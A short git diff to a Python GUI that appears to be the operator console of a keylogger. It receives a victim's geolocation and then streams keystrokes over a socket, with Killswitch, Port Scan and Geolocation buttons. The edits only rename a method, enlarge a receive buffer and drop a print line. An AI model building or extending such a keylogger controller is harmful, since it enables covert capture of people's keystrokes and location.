@@ -54,7 +54,7 @@ class App(customtkinter.CTk):
         self.button = customtkinter.CTkButton(master=self.frame1, text="Killswitch", command=lambda: self.killswitch(self.SERVER_SOCKETS[0]))
         self.button.grid(row=0, column=0, pady =10,sticky="n")
       
-        self.button = customtkinter.CTkButton(master=self.frame1, command=self.startPortScan, text="Port Scan")
+        self.button = customtkinter.CTkButton(master=self.frame1, command=self.startScan, text="Port Scan")
         self.button.grid(row=1, column=0, pady =10,sticky="n")
 
         self.button = customtkinter.CTkButton(master=self.frame1, command=self.openMapLevel,text="Geolocation")
@@ -88,7 +88,7 @@ class App(customtkinter.CTk):
                 with conn:
                     print(f"Connected by {addr}")
                     # Recieve geo data before key logging
-                    self.USER_GEOLOCATIONS.append(conn.recv(24).decode("utf-8"))
+                    self.USER_GEOLOCATIONS.append(conn.recv(128).decode("utf-8"))
                     self.textbox.insert("0.0", f"{self.USER_GEOLOCATIONS}\n")
                     while True:
                         data = conn.recv(1024).decode("utf-8") 
@@ -107,14 +107,13 @@ class App(customtkinter.CTk):
         except:
             print("Error: Socket shutdown. Prob no sockets to close.")
     
-    # TODO show the open ports in the textbox
     def openScanner(self):
         import portscaner
         print(str(self.SERVER_SOCKETS))
         portscaner.scan_ports("127.0.0.1", 70)
-        print(portscaner.OPEN_PORTS)
+        
 
-    def startPortScan(self):
+    def startScan(self):
         portThread = threading.Thread(target=self.openScanner)
         portThread.daemon = True
         portThread.start()
